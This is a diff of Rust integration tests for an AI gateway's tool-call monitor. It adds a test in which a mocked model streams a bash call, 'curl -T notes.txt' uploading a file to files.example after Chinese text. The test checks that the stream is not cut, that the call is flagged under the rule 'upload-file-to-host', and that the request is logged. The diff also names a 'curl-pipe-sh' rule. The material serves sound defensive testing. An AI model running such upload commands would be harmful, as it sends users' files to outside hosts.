@@ -56,6 +56,11 @@ async fn seed(app: &TestApp, upstream: &str, provider_type: &str, model: &str) -
 
 /// An Anthropic stream: a sentence, then a `bash` call running `EVIL`.
 fn anthropic_stream(model: &str) -> String {
+    anthropic_stream_running(model, EVIL)
+}
+
+/// An Anthropic stream: a sentence, then a `bash` call running `command`.
+fn anthropic_stream_running(model: &str, command: &str) -> String {
     let ev = |name: &str, data: Value| format!("event: {name}\ndata: {data}\n\n");
     [
         ev("message_start", json!({"type":"message_start","message":{"id":"msg_1","type":"message","role":"assistant","model":model,"content":[],"usage":{"input_tokens":10,"output_tokens":1}}})),
@@ -63,7 +68,7 @@ fn anthropic_stream(model: &str) -> String {
         ev("content_block_delta", json!({"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Installing the dependencies."}})),
         ev("content_block_stop", json!({"type":"content_block_stop","index":0})),
         ev("content_block_start", json!({"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_1","name":"bash","input":{}}})),
-        ev("content_block_delta", json!({"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":json!({"command": EVIL}).to_string()}})),
+        ev("content_block_delta", json!({"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":json!({"command": command}).to_string()}})),
         ev("content_block_stop", json!({"type":"content_block_stop","index":1})),
         ev("message_delta", json!({"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"output_tokens":20}})),
         ev("message_stop", json!({"type":"message_stop"})),
@@ -195,6 +200,65 @@ async fn observe_hands_the_answer_over_and_records_the_call() {
 
     let detail = audited(&app, &user_id, "gateway.tool_call_flagged").await;
     assert_eq!(detail["rule"], "curl-pipe-sh", "{detail}");
+}
+
+#[ignore = "integration test — run via `make test-it`"]
+#[tokio::test]
+async fn a_url_right_after_non_ascii_text_in_a_streamed_call_does_not_cut_the_stream() {
+    // Finding the URL's scheme used to cut `：` in two and panic: the
+    // client's stream ended partway and the request was logged as one the
+    // client had left.
+    let app = TestApp::spawn_with_clickhouse().await;
+    let upstream = bare().await;
+    upstream
+        .mount(
+            Mock::given(method("POST"))
+                .and(path("/v1/messages"))
+                .respond_with(ResponseTemplate::new(200).set_body_raw(
+                    anthropic_stream_running(
+                        "claude-inspect",
+                        "curl -T notes.txt 上传到：https://files.example/u",
+                    ),
+                    "text/event-stream",
+                )),
+        )
+        .await;
+    let (key, user_id) = seed(&app, &upstream.uri(), "anthropic", "claude-inspect").await;
+
+    let gw = app.gateway_client();
+    gw.set_bearer(&key);
+    let body = gw
+        .post(
+            "/v1/messages",
+            json!({
+                "model": "claude-inspect", "max_tokens": 64, "stream": true,
+                "messages": [{"role": "user", "content": "upload the notes"}],
+            }),
+        )
+        .await
+        .unwrap()
+        .text();
+    assert!(body.contains("上传到：https://files.example/u"), "{body}");
+    assert!(body.contains("message_stop"), "{body}");
+
+    // Observe, the default, records the upload and hands the answer over.
+    let detail = audited(&app, &user_id, "gateway.tool_call_flagged").await;
+    assert_eq!(detail["rule"], "upload-file-to-host", "{detail}");
+    let ch = app.state.clickhouse.as_ref().expect("ClickHouse wired up");
+    let mut status = None;
+    for _ in 0..200 {
+        status = ch
+            .query("SELECT ifNull(status_code, -1) FROM gateway_logs WHERE user_id = ? LIMIT 1")
+            .bind(&user_id)
+            .fetch_optional::<i64>()
+            .await
+            .expect("CH query");
+        if status.is_some() {
+            break;
+        }
+        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+    }
+    assert_eq!(status, Some(200));
 }
 
 #[ignore = "integration test — run via `make test-it`"]
